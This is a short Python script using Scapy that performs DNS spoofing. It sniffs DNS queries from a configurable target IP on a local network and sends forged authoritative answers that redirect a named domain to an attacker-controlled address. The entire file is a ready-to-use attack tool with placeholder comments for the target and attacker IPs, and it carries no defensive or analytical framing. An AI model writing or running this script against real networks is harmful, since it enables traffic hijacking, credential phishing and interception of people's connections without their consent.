# dns_spoofing.py
from scapy.all import *
from scapy.layers.inet import IP,UDP
from scapy.layers.dns import DNS,DNSRR
import random

# Define the target IP address
target_ip = '192.168.0.91'  # Change to the target's IP address

# Define the legitimate DNS server IP address
dns_server_ip = '8.8.8.8'  # Example: Google's DNS server

# Define the domain to spoof
spoofed_domain = 'one.co.il'

# Define the malicious IP address to redirect to
malicious_ip = '192.168.0.10'  # Change to the attacker's IP address


def dns_spoof(pkt):
    if (pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0 and
            pkt.getlayer(DNS).qd.qname == spoofed_domain + '.'):
        # Create a DNS response
        spoofed_pkt = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                       UDP(dport=pkt[UDP].sport, sport=53) /
                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                           an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=malicious_ip)))

        # Send the spoofed DNS response
        send(spoofed_pkt, verbose=0)
        print(f"Spoofed DNS response sent to {pkt[IP].src} for {spoofed_domain}")


# Sniff DNS queries from the target
sniff(filter=f"udp port 53 and ip src {target_ip}", prn=dns_spoof)
